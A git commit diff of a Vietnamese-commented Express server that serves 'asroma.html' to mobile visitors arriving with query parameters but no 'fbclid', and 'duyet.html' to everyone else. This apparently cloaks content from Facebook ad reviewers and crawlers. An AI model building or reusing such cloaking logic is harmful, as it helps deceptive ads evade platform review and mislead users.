db29a6bb8e35e53a9d558774e290a1112f7c05f4
mkttuan2k <137670272+mkttuan2k@users.noreply.github.com>
2023-12-23 14:16:35 +0700

    Update index.js

--- index.js
+++ index.js
@@ -2,34 +2,38 @@ const express = require("express");
 const path = require("path");
 const app = express();
 const fs = require("fs");
-const port =3000;
+const port = 3000;
 const requestIp = require("request-ip");
+const useragent = require("express-useragent");
+
+// Sử dụng middleware express-useragent để trích xuất thông tin User-Agent
+app.use(useragent.express());
 
 app.get("*", (req, res) => {
-    try {
-      const clientIp = requestIp.getClientIp(req);
-      console.log("clientIp", clientIp);
-  
-      fs.writeFile("log.txt", clientIp, function(err) {});
-  
-      const query = req.query;
-      const userAgent = req.headers['user-agent'];
-  
-      // Kiểm tra nếu User-Agent chứa chuỗi "Mobile" hoặc "Tablet"
-      const isMobileOrTablet = userAgent && /Mobile|Tablet/i.test(userAgent);
-  
-      if (isMobileOrTablet && query && Object.keys(query).length > 0 && !Object.keys(query).includes("fbclid")) {
-        res.sendFile(path.join(__dirname, "/asroma.html"));
-      } else {
-        res.sendFile(path.join(__dirname, "/duyet.html"));
-      }
-    } catch (err) {
+  try {
+    const clientIp = requestIp.getClientIp(req);
+    const query = req.query;
+
+    // Lấy thông tin User-Agent từ middleware express-useragent
+    const userAgent = req.useragent;
+
+    // Kiểm tra xem có tham số truy vấn và "fbclid" không hiện diện
+    // và người dùng đang sử dụng điện thoại hoặc máy tính bảng
+    if (
+      query &&
+      Object.keys(query).length > 0 &&
+      !Object.keys(query).includes("fbclid") &&
+      (userAgent.isMobile || userAgent.isTablet)
+    ) {
+      res.sendFile(path.join(__dirname, "/asroma.html"));
+    } else {
       res.sendFile(path.join(__dirname, "/duyet.html"));
     }
-  });
-  
-  app.listen(port, () => {
-    console.log(`Example app on port ${port}`);
-  });
-  
-  
+  } catch (err) {
+    res.sendFile(path.join(__dirname, "/duyet.html"));
+  }
+});
+
+app.listen(port, () => {
+  console.log(`Ứng dụng ví dụ trên cổng ${port}`);
+});
